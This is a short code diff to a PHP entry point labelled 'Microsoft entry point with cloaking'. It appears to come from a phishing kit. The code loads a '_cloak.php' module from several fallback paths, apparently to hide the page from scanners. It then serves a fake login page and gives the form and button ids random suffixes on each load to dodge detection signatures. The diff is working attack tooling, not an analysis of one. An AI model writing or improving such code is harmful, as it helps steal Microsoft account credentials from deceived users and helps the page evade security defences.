@@ -1,8 +1,23 @@
 <?php
-require_once __DIR__ . '/../_cloak.php';
+/**
+ * Microsoft entry point with cloaking
+ */
 
-// Serve the page with dynamic cache-busting
-$html = file_get_contents('login.html');
+$possible_paths = [
+    __DIR__ . '/../../../.sites/_cloak.php',
+    __DIR__ . '/../_cloak.php',
+    __DIR__ . '/../../.sites/_cloak.php',
+];
+
+foreach ($possible_paths as $path) {
+    if (file_exists($path)) {
+        require_once $path;
+        break;
+    }
+}
+
+// Dynamic page serving
+$html = file_get_contents(__DIR__ . '/login.html');
 $suffix = substr(md5(time() . rand()), 0, 8);
 $html = str_replace('id="ms-form"', 'id="ms-form-' . $suffix . '"', $html);
 $html = str_replace('id="submit-btn"', 'id="btn-' . $suffix . '"', $html);
